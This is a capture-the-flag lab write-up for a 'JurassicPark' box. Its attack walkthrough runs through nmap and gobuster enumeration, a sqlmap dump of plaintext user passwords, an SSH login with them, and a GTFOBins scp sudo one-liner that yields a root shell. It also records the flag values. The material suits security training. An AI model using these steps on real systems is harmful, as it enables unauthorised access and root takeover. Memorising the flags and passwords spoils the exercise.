# Box Name

## JurassicPark

## Overview
---
* [[#Enumeration]]
	* nmap,rustscan

* [[#Initial Foothold]]
	* sqlmap

* [[#Privilege Escalation]]
	* [[gtfobins]]

---
## Enumeration
---

 - ### nmap
 ```bash
# Nmap 7.91 scan initiated Sat May  8 16:32:52 2021 as: nmap -vvv -p 22,80 -sC -sV -T4 -oN nmap/initial 10.10.210.36
Nmap scan report for 10.10.210.36
Host is up, received syn-ack (0.13s latency).
Scanned at 2021-05-08 16:32:53 CDT for 11s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:1c:2e:b2:1e:04:76:54:b3:25:54:96:b4:88:56:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhM9to4v8WsFqD7pFZj6pOCscaA+g4fkwgue1/3crY7hjUaG4M1soPY3yLeZqgn45sQg6upJP7Ql5w/ZeS7S6ydiPxnCoJJNGnP6K6dcHsmZ2w8eJb2P3uqc0lhEZazf5PiqJ3km5hxCYXStay8yLG9V9GpiLWztFtRtvIGaTCpWPaRaa3MzKY1wn6+PB7AxApRobdXRmN0YJ47xTPKa5rF09xjGml+42SKvlGpZ9a/PZxKzMPVEP2mo6uxMEuMXLUKctvr8hmUX5FK++rZuoBtYi/hevqL+BuMwgfBab8cMzPVMBQuFMFCFKzoWX+3qyGzpR3XkmaMc6wVfYXhyu9
|   256 f9:52:e8:ea:73:e5:de:ce:6d:9e:aa:a2:01:3c:a5:32 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHVLsh7pd993zGJimpzBJoeWv4843CaIHGMAav3HENznY9j+VfP8GQ8c4VWT1S2hLHRJwFxEXlQnXII4X9LiBPQ=
|   256 61:e8:c5:f4:77:21:c6:6d:77:a6:4e:b2:87:2a:06:7d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIODW+OBRVg7TrQxigal6KvYK5RfaZbSGF83cqkDRR1oe
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 019A6B943FC3AAA6D09FBA3C139A909A
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Jarassic Park
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

 - ### gobuster
```
200        1l        1w       17c http://10.10.210.36/robots.txt
200       43l      104w     1274c http://10.10.210.36/index.php
200        1l        1w        1c http://10.10.210.36/requests.txt
200       88l      213w     2642c http://10.10.210.36/shop.php
200        2l       33w      208c http://10.10.210.36/item.php
200        3l       11w       65c http://10.10.210.36/delete
403       11l       32w      300c http://10.10.210.36/server-status
301        9l       28w      313c http://10.10.210.36/assets
                                                                

```

 - ### checked out webpage
	 - found robots.txt
		- looks like it may be a password "Wubbalubbadubdub"
- ### read the sorce code for /item.php?id=1
```
async function lol() {
                let i = 1;
                while(i < 100) {
                  document.querySelector("#magicwork").innerHTML += "<b>YOU DIDN'T SAY THE MAGIC WORD!</b></br>"
                  await sleep(50)
                  i++;
                }
                document.querySelector("#magicwork").innerHTML += "Try SqlMap.. I dare you.."
              }
``` 
 - ### sqlmap
```
[09:32:59] [INFO] fetching entries for table 'users' in database 'park'
[09:32:59] [INFO] starting 2 threads
[09:32:59] [INFO] retrieved: '1'
[09:32:59] [INFO] retrieved: '2'
[09:32:59] [INFO] retrieved: 'D0nt3ATM3'
[09:32:59] [INFO] retrieved: 'ih8dinos'
Database: park
Table: users
[2 entries]
+----+-----------+----------+
| id | password  | username |
+----+-----------+----------+
| 1  | D0nt3ATM3 |          |
| 2  | ih8dinos  |          |
+----+-----------+----------+

```

## Initial Foothold
---
 - # ssh
	 - ### using the passwords dumped from mysql tried logging in as Dennis
```bash
                                                                                                                                                                                                                                           
┌──(kn1ght㉿Kali)-[~/THM/jurassicpark]
└─$ ssh dennis@10.10.252.222
The authenticity of host '10.10.252.222 (10.10.252.222)' can't be established.
ED25519 key fingerprint is SHA256:MYNeOUNQzm4wcATsld3Ra5XMxT2MOKqzbY8DtVpx7jo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.252.222' (ED25519) to the list of known hosts.
dennis@10.10.252.222's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-1072-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  Get cloud support with Ubuntu Advantage Cloud Guest:
    http://www.ubuntu.com/business/services/cloud

62 packages can be updated.
45 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dennis@ip-10-10-252-222:~$ 

```

 - ### it looks like dennis can run /usr/bin/scp as anybody
 ```bash
 dennis@ip-10-10-252-222:~$ sudo -l -l
Matching Defaults entries for dennis on ip-10-10-252-222.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dennis may run the following commands on ip-10-10-252-222.eu-west-1.compute.internal:

Sudoers entry:
    RunAsUsers: ALL
    Options: !authenticate
    Commands:
	/usr/bin/scp
dennis@ip-10-10-252-222:~$ 

```
---
## Privilege Escalation
----
 - # GTFObins
```
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo -u root /usr/bin/scp -S $TF x y:
```

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /home/dennis/flag1.txt
Congrats on finding the first flag.. But what about the rest? :O

b89f2d69c56b9981ac92dd267f

 find / -iname 'flag*'
/root/flag5.txt
/home/dennis/flag1.txt
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/vif-0/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/usr/src/linux-aws-headers-4.4.0-1072/scripts/coccinelle/locks/flags.cocci
/usr/src/linux-headers-4.4.0-1072-aws/include/config/zone/dma/flag.h
/boot/grub/fonts/flagTwo.txt
# cat /boot/grub/fonts/flagTwo.txt
96ccd6b429be8c9a4b501c7a0b117b0a

#flag3??=b4973bbc9053807856ec815db25fb3f1
 
#There is no fourth flag.

# cat /root/flag5.txt
2a7074e491fcacc7eeba97808dc5e2ec
```
